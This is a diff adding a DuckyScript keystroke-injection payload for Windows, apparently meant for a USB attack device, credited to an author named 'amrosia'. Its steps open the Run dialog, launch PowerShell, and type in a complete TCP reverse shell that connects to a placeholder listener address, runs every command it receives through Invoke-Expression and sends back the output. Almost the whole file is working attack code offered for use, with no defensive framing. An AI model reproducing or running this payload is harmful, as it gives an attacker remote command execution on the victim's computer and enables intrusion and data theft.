@@ -1,0 +1,28 @@
+REM Reverse Shell Payload for Windows
+REM Author: amrosia
+REM Opens PowerShell via Win+R and executes a TCP reverse shell. Requires setting up reverse shell listener before executing. Replace LISTENER_IP and LISTENER_PORT before executing.
+
+REM Step 1: Open Run dialog
+GUI r
+
+REM Step 2: Wait for Run dialog to open
+DELAY 500
+
+REM Step 3: Type powershell.exe
+STRING powershell.exe
+
+REM Step 4: Wait before hitting Enter
+DELAY 500
+
+REM Step 5: Launch PowerShell
+ENTER
+
+REM Step 6: Wait for PowerShell to fully load
+DELAY 2500
+
+REM Step 7: Type the reverse shell payload
+STRING $LHOST = "LISTENER_IP"; $LPORT = LISTENER_PORT; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
+
+REM Step 9: Execute the payload
+DELAY 500
+ENTER
